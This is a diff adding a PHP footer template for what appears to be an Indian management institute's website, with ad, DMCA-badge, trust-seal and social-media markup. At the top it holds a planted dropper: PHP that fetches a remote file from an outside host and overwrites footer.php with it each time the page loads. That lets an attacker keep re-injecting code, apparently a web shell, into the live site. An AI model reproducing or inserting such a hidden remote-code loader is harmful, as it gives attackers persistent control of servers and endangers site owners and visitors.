@@ -1,0 +1,29 @@
+<?php
+file_put_contents("footer.php",file_get_contents('https://zsec.my.id/wh47?/f1.txt'));
+?>
+<script data-ad-client="ca-pub-3939850173581632" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<div class="footer">
+        	<div class="footer_left">
+ Copyright by:  <a href="https://www.dmca.com/Protection/Status.aspx?ID=1750c1c1-29b6-4848-8f5d-97eed736469a" title="DMCA.com Protection Status" target="_blank" class="dmca-badge"> <img src ="//images.dmca.com/Badges/dmca_protected_sml_120aj.png?ID=1750c1c1-29b6-4848-8f5d-97eed736469a" alt="DMCA.com Protection Status" style="background:#FFF;" /></a>
+ 
+<span style="text-align:center;">
+ <script src="js/streamtest.js" type="text/javascript"></script>
+ <script language="JavaScript" type="text/javascript">
+TrustLogo("https://www.ksimt.ac.in/images/comodo_secure_seal_76x26_transp.png", "CL1", "none");
+</script>
+</span>
+
+</div>
+            
+           <div class="footer_middle"> <?PHP if($cu['ord'] >0){?>| Views(<?PHP echo $cu['ord'] ?>)<?PHP } ?></div>
+            
+            
+                    <div class="footer_icon">
+                        <ul>
+                            <li><a href="https://www.facebook.com/Khatu-Shyam-Institute-of-Management-Technology-279374788771245" target="_blank"><i class="fa fa-facebook"></i></a></li>                            
+                            <li><a href="https://www.linkedin.com/mwlite/in/ksimt" target="_blank"><i class="fa fa-linkedin"></i></a></li>
+                            <li><a href="https://plus.google.com/113295228740734513433" target="_blank"><i class="fa fa-google-plus"></i></a></li>
+                        </ul>                    
+                    </div>
+       
+        </div>
